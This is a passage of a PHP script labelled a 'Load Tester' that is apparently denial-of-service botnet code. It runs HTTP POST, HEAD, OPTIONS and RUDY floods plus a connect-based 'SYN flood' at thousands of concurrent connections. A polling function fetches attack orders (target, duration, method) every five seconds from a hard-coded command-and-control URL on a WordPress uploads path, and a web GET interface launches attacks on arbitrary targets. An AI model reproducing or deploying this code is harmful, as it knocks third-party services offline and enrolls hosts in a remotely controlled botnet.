        curl_multi_setopt($multi_handles[$i], CURLMOPT_MAX_TOTAL_CONNECTIONS, 4000);
        
        $session_pools[$i] = [];
        for ($j = 0; $j < $sockets_per_pool; $j++) {
            $session_id = SessionManager::createSession();
            $session_pools[$i][$j] = $session_id;
            
            $use_post = false;
            $custom_method = null;
            
            if ($method == AttackMethods::POST_FLOOD || $mode == 'POST' || 
                ($method == AttackMethods::RUDY && mt_rand(0, 100) > 50)) {
                $use_post = true;
            } elseif ($method == AttackMethods::HEAD_FLOOD) {
                $custom_method = 'HEAD';
            } elseif ($method == AttackMethods::OPTIONS_FLOOD) {
                $custom_method = 'OPTIONS';
            }
            
            $ch = setup_curl_handle($target_url, $session_id, $use_post, $custom_method);
            curl_setopt($ch, CURLOPT_TIMEOUT, 10);
            curl_multi_add_handle($multi_handles[$i], $ch);
        }
    }
    
    OutputManager::write("[HTTP] Initialized $num_pools pools");
    
    $last_stats_time = $start_time;
    $peak_rps = 0;
    
    while (microtime(true) < $end_time) {
        $current_time = microtime(true);
        
        for ($i = 0; $i < $num_pools; $i++) {
            $active = null;
            curl_multi_exec($multi_handles[$i], $active);
            
            while ($info = curl_multi_info_read($multi_handles[$i])) {
                $ch = $info['handle'];
                $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
                if ($http_code != 200 && $http_code != 404 && $http_code != 403) $failed_requests++;
                curl_multi_remove_handle($multi_handles[$i], $ch);
                curl_close($ch);
                $total_requests++;
                
                $pool_index = mt_rand(0, $num_pools - 1);
                $session_index = array_rand($session_pools[$pool_index]);
                $session_id = $session_pools[$pool_index][$session_index];
                
                $use_post = false;
                $custom_method = null;
                
                if ($method == AttackMethods::POST_FLOOD || $mode == 'POST' || 
                    ($method == AttackMethods::RUDY && mt_rand(0, 100) > 50)) {
                    $use_post = true;
                } elseif ($method == AttackMethods::HEAD_FLOOD) {
                    $custom_method = 'HEAD';
                } elseif ($method == AttackMethods::OPTIONS_FLOOD) {
                    $custom_method = 'OPTIONS';
                }
                
                $new_ch = setup_curl_handle($target_url, $session_id, $use_post, $custom_method);
                curl_setopt($new_ch, CURLOPT_TIMEOUT, 10);
                curl_multi_add_handle($multi_handles[$pool_index], $new_ch);
            }
            curl_multi_select($multi_handles[$i], 0.001);
        }
        
        if ($current_time - $last_stats_time >= 5) {
            $elapsed = $current_time - $start_time;
            $current_rps = round($total_requests / $elapsed);
            $peak_rps = max($peak_rps, $current_rps);
            $active_sessions = SessionManager::getActiveSessionsCount();
            $mem_usage = round(memory_get_usage(true) / 1024 / 1024, 2);
            
            OutputManager::write("[STATS] RPS: $current_rps | Peak: $peak_rps | Total: " . 
                 number_format($total_requests) . " | Failed: " . number_format($failed_requests) . 
                 " | Sessions: $active_sessions | Mem: {$mem_usage}MB");
            $last_stats_time = $current_time;
        }
        
        usleep(1000);
    }
    
    for ($i = 0; $i < $num_pools; $i++) {
        $active = null;
        curl_multi_exec($multi_handles[$i], $active);
        while ($info = curl_multi_info_read($multi_handles[$i])) {
            curl_multi_remove_handle($multi_handles[$i], $info['handle']);
            curl_close($info['handle']);
        }
        curl_multi_close($multi_handles[$i]);
    }
    
    $elapsed = microtime(true) - $start_time;
    $avg_rps = round($total_requests / $elapsed);
    
    OutputManager::write("[HTTP] Completed: Avg RPS: $avg_rps | Peak RPS: $peak_rps | Total: " . 
         number_format($total_requests) . " | Failed: " . number_format($failed_requests));
}

function syn_flood_attack($host, $port, $threads, $duration) {
    $start_time = microtime(true);
    $end_time = $start_time + $duration;
    $total_packets = 0;
    
    OutputManager::write("[SYN] Starting flood on $host:$port with $threads threads");
    
    while (microtime(true) < $end_time) {
        for ($i = 0; $i < $threads; $i++) {
            $socket = @fsockopen($host, $port, $errno, $errstr, 0.5);
            if ($socket) {
                fclose($socket);
                $total_packets++;
            }
        }
        usleep(50000);
    }
    
    return $total_packets;
}

function check_api_for_commands() {
    $api_url = "https://tuvanthienha.vn/wp-content/uploads/2024/03/api.php";
    
    try {
        $ch = curl_init($api_url);
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT => 10,
            CURLOPT_SSL_VERIFYPEER => false
        ]);
        
        $response = curl_exec($ch);
        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        
        if ($http_code == 200 && !empty($response)) {
            if (strpos($response, '<?xml') !== false) {
                $xml = @simplexml_load_string($response);
                if ($xml && isset($xml->url) && isset($xml->time)) {
                    $target = (string)$xml->url;
                    $time = (int)$xml->time;
                    $wait = (int)$xml->wait;
                    $method = isset($xml->method) ? (string)$xml->method : 'FLOOD';
                    $conc = isset($xml->conc) ? (int)$xml->conc : 1000;
                    $mode = isset($xml->mode) ? (string)$xml->mode : 'NON';
                    $port = isset($xml->port) ? (int)$xml->port : 80;
                    
                    OutputManager::write("[API] Command received: $method on $target for {$time}s");
                    OutputManager::write("[API] Threads: $conc | Mode: $mode | Port: $port");
                    
                    if ($wait > 0) {
                        OutputManager::write("[API] Waiting $wait seconds...");
                        sleep($wait);
                    }
                    
                    execute_attack($target, $time, $conc, $method, $mode, $port);
                    return true;
                }
            }
        }
        OutputManager::write("[API] No commands found");
        return false;
    } catch (Exception $e) {
        OutputManager::write("[API] Error: " . $e->getMessage());
        return false;
    }
}

// Handle CLI arguments
if (CLI_MODE) {
    $options = getopt("s:u:t:c:m:p:o:q", ["silent", "url:", "time:", "conc:", "method:", "port:", "mode:", "query"]);
    
    if (isset($options['s']) || isset($options['silent'])) {
        define('SILENT_MODE', true);
    }
    
    if (isset($options['u']) || isset($options['url'])) {
        $url = isset($options['u']) ? $options['u'] : $options['url'];
        $time = isset($options['t']) ? intval($options['t']) : (isset($options['time']) ? intval($options['time']) : 30);
        $conc = isset($options['c']) ? intval($options['c']) : (isset($options['conc']) ? intval($options['conc']) : 1000);
        $method = isset($options['m']) ? $options['m'] : (isset($options['method']) ? $options['method'] : 'FLOOD');
        $port = isset($options['p']) ? intval($options['p']) : (isset($options['port']) ? intval($options['port']) : 80);
        $mode = isset($options['o']) ? $options['o'] : (isset($options['mode']) ? $options['mode'] : 'NON');
        
        if (!empty($url) && $conc > 0 && $time > 0) {
            execute_attack($url, $time, $conc, $method, $mode, $port);
            exit(0);
        } else {
            if (!defined('SILENT_MODE') || !SILENT_MODE) {
                OutputManager::write("Usage: php " . basename(__FILE__) . " -u URL -t TIME -c CONCURRENT -m METHOD [-p PORT] [-o MODE] [-s]");
                OutputManager::write("Methods: " . implode(", ", array_values((new ReflectionClass('AttackMethods'))->getConstants())));
                OutputManager::write("Example: php " . basename(__FILE__) . " -u http://example.com -t 60 -c 5000 -m RANK -p 80");
            }
            exit(1);
        }
    }
    
    if (isset($options['q']) || isset($options['query'])) {
        if (!defined('SILENT_MODE') || !SILENT_MODE) {
            OutputManager::write("[CLI] Checking API for commands...");
        }
        check_api_for_commands();
        exit(0);
    }
    
    if (!defined('SILENT_MODE') || !SILENT_MODE) {
        OutputManager::write("[CLI] Load tester started in CLI mode");
        OutputManager::write("[CLI] Available methods: " . implode(", ", array_values((new ReflectionClass('AttackMethods'))->getConstants())));
        OutputManager::write("[CLI] Polling API every 5 seconds...");
        OutputManager::write("[CLI] Press Ctrl+C to stop");
    }
    
    while (true) {
        check_api_for_commands();
        sleep(5);
    }
}

if (isset($_GET['check'])) {
    ob_start();
    check_api_for_commands();
    $output = ob_get_clean();
    echo $output;
    exit;
}

if (isset($_GET['type'])) {
    ob_start();
    $type = $_GET['type'] ?? '';
    $url = $_GET['url'] ?? '';
    $met = $_GET['met'] ?? '';
    $conc = intval($_GET['conc'] ?? 1000);
    $time = intval($_GET['time'] ?? 30);
    $mode = $_GET['mode'] ?? 'NON';
    $port = intval($_GET['port'] ?? 80);
    
    if (!empty($url) && !empty($met) && $conc > 0 && $time > 0) {
        execute_attack($url, $time, $conc, $met, $mode, $port);
    } else {
        OutputManager::write("[ERROR] Invalid parameters");
    }
    
    $output = ob_get_clean();
    echo $output;
    exit;
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>Load Tester - Background Service</title>
    <style>
        body { 
            background: black; 
            color: lime; 
            font-family: monospace; 
            margin: 0; 
            padding: 20px; 
            font-size: 14px;
        }
        #output { 
            white-space: pre-wrap;
            word-wrap: break-word;
            overflow-y: auto;
            height: calc(100vh - 40px);
        }
        #status {
            position: fixed;
            top: 10px;
            right: 10px;
            background: #111;
            padding: 5px 10px;
            border: 1px solid lime;
            font-size: 12px;
        }
    </style>
</head>
<body>
    <div id="status">Status: <span id="statusText">ACTIVE</span> | Next check: <span id="countdown">5</span>s</div>
    <div id="output">[SYSTEM] Load tester started. Checking for commands every 5 seconds...<br></div>

    <script>
        let output = document.getElementById('output');
        let statusText = document.getElementById('statusText');
        let countdown = document.getElementById('countdown');
        let checkInterval = 5000;
        let countdownValue = 5;
        
        function updateOutput(message) {
            output.innerHTML += message + '\n';
            output.scrollTop = output.scrollHeight;
        }
        
        function checkForCommands() {
            statusText.textContent = 'CHECKING';
            statusText.style.color = '#ff0';
            
            fetch('?check=1')
                .then(response => response.text())
                .then(data => {
                    if (data.trim()) {
                        updateOutput(data);
                    }
                    statusText.textContent = 'ACTIVE';
                    statusText.style.color = '#0f0';
                    countdownValue = 5;
                })
                .catch(error => {
                    updateOutput('[ERROR] Failed to check API: ' + error.message);
                    statusText.textContent = 'ERROR';
                    statusText.style.color = '#f00';
                    countdownValue = 5;
                });
        }
        
        checkForCommands();
        
        setInterval(() => {
            checkForCommands();
        }, checkInterval);
        
        setInterval(() => {
            countdownValue--;
            if (countdownValue < 0) countdownValue = 5;
            countdown.textContent = countdownValue;
        }, 1000);
        
        setInterval(() => {
            output.scrollTop = output.scrollHeight;
        }, 100);
    </script>
</body>
</html>
